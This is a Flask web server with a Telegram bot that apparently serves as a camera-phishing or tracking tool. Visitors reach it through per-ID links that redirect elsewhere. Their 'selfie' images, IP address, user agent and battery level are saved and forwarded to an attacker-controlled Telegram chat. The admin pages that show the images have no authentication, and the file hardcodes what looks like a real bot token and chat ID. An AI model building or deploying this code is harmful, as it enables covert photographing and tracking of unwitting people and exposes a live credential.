from flask import Flask, request, jsonify, render_template, redirect, url_for
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import base64
import re
import os
from datetime import datetime
import requests

app = Flask(__name__, static_url_path='/static')

# Ensure the 'static' directory exists
if not os.path.exists('static'):
    os.makedirs('static')

# Store the redirect URLs and the current index in a simple text file
REDIRECT_URLS_FILE = 'redirect_urls.txt'

# Telegram Bot API details
TELEGRAM_BOT_TOKEN = '7448594075:AAFMCpeHgz1sjE7LgN0XMyPW14Bz8x2qab8'
TELEGRAM_CHAT_ID = '5197344486'
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Function to send photo to Telegram
def send_photo_to_telegram(photo_path, ip, user_agent, battery):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    files = {'photo': open(photo_path, 'rb')}
    caption = f"IP: {ip}\nUser Agent: {user_agent}\nBattery: {battery}%"
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
    response = requests.post(url, files=files, data=data)
    return response.json()

# Function to send message to Telegram
def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    response = requests.post(url, data=data)
    return response.json()

# Endpoint to handle image upload
@app.route('/upload', methods=['POST'])
def upload_image():
    data = request.get_json()
    image_data = data['image']
    battery = data['battery']
    # Remove the data:image/png;base64, part
    image_data = re.sub('^data:image/.+;base64,', '', image_data)
    # Decode the image data
    image_data = base64.b64decode(image_data)

    # Save the image with a unique filename
    filename = f'static/selfie_{datetime.now().strftime("%Y%m%d_%H%M%S_%f")}.png'
    with open(filename, 'wb') as f:
        f.write(image_data)

    # Get IP and User Agent
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Send the image and information to Telegram
    send_photo_to_telegram(filename, ip, user_agent, battery)

    return jsonify({'message': 'Image uploaded and sent to Telegram successfully', 'filename': filename})

# Serve the main page
@app.route('/')
def index():
    id = request.args.get('id', 'default')
    redirect_url = get_redirect_url_by_id(id)
    return render_template('index.html', redirect_url=redirect_url)

# Serve the admin page
@app.route('/admin')
def admin():
    image_files = os.listdir('static')
    image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
    redirect_urls = get_redirect_urls()
    return render_template('admin.html', images=image_files, redirect_urls=redirect_urls)

# Handle setting the redirect URLs
@app.route('/set_redirect_urls', methods=['POST'])
def set_redirect():
    ids = request.form.getlist('ids')
    urls = request.form.getlist('urls')
    redirect_urls = dict(zip(ids, urls))
    set_redirect_urls(redirect_urls)
    return redirect(url_for('admin'))

# Serve the lightweight mobile-friendly admin page
@app.route('/admin2')
def admin2():
    image_files = os.listdir('static')
    image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
    return render_template('admin2.html', images=image_files)

# Endpoint to delete images
@app.route('/delete/<path:filename>', methods=['POST'])
def delete_image(filename):
    try:
        os.remove(filename)
        return redirect(url_for('admin'))
    except Exception as e:
        return str(e), 500

# Function to get redirect URLs
def get_redirect_urls():
    if not os.path.exists(REDIRECT_URLS_FILE):
        return {'default': 'https://example.com'}  # Default redirect URL
    with open(REDIRECT_URLS_FILE, 'r') as f:
        return {line.split(',')[0].strip(): line.split(',')[1].strip() for line in f.readlines() if ',' in line}

# Function to set redirect URLs
def set_redirect_urls(urls):
    with open(REDIRECT_URLS_FILE, 'w') as f:
        for id, url in urls.items():
            f.write(f"{id},{url}\n")

# Get the redirect URL for a given ID
def get_redirect_url_by_id(id):
    urls = get_redirect_urls()
    return urls.get(id, urls.get('default', 'https://example.com'))

# Telegram Bot setup
updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Welcome to the admin bot! Use /seturl to set redirect URLs, /viewurls to view current URLs, and /viewimages to view uploaded images.')

def seturl(update: Update, context: CallbackContext) -> None:
    try:
        id, url = context.args
        redirect_urls = get_redirect_urls()
        redirect_urls[id] = url
        set_redirect_urls(redirect_urls)
        update.message.reply_text(f'Redirect URL for ID {id} set to {url}')
    except ValueError:
        update.message.reply_text('Usage: /seturl <id> <url>')

def viewurls(update: Update, context: CallbackContext) -> None:
    redirect_urls = get_redirect_urls()
    urls_text = '\n'.join([f'ID: {id} - URL: {url}' for id, url in redirect_urls.items()])
    update.message.reply_text(f'Current Redirect URLs:\n{urls_text}')

def viewimages(update: Update, context: CallbackContext) -> None:
    image_files = os.listdir('static')
    image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
    for image in image_files:
        update.message.reply_photo(photo=open(image, 'rb'), caption=image)

dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("seturl", seturl))
dispatcher.add_handler(CommandHandler("viewurls", viewurls))
dispatcher.add_handler(CommandHandler("viewimages", viewimages))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    updater.start_polling()
    updater.idle()
